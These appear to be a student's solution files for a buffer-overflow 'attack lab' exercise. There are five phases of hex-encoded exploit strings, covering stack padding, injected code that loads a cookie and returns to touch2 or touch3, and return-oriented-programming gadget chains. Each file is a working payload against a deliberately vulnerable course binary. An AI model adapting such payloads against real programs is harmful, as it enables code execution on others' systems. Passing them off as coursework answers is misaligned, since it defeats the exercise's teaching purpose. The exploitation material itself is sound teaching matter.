phase1.txt:
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00 00
00 00 00 00 00 00 00
2c 5b 55 55 55 55

phase2.txt:
48 c7 c7 30 51 c1 40 c3  /* my cookie */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* padding 56 bytes */
b8 3b 61 55 00 00 00 00  /* address of register %rsp */
5a 5b 55 55 55 55 00 00  /* address of touch2 function */

phase3.txt:
48 c7 c7 00 3c 61 55 c3  /* %rsp +0x48  */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* padding 56 bytes */
b8 3b 61 55 00 00 00 00  /* address of register %rsp */
71 5c 55 55 55 55 00 00  /* address of touch3 */
34 30 63 31 35 31 33 30  /* cookie as string format */

phase4.txt:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* padding 56 bytes */
32 5d 55 55 55 55 00 00  /* gadget 1 */
30 51 c1 40 00 00 00 00  /* my cookie */
15 5d 55 55 55 55 00 00  /* gagdget 2 */
5a 5b 55 55 55 55 00 00  /* address of touch2 */

phaseLast.txt:
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00  /* padding the 56 bytes */
25 5e 55 55 55 55 00 00  /* mov rsp, rax */
15 5d 55 55 55 55 00 00  /* mov rax,rdi */
32 5d 55 55 55 55 00 00  /* pop rax */
48 00 00 00 00 00 00 00  /* offset */
bf 5d 55 55 55 55 00 00  /* mov eax, edx */
ba 5d 55 55 55 55 00 00  /* mov edx, ecx */
ea 5d 55 55 55 55 00 00  /* mov ecx, esi */
4f 5d 55 55 55 55 00 00  /* lea add_xy */
15 5d 55 55 55 55 00 00  /* mov rax, rdi */
71 5c 55 55 55 55 00 00  /* touch3 address */
34 30 63 31 35 31 33 30  /* cookie strings */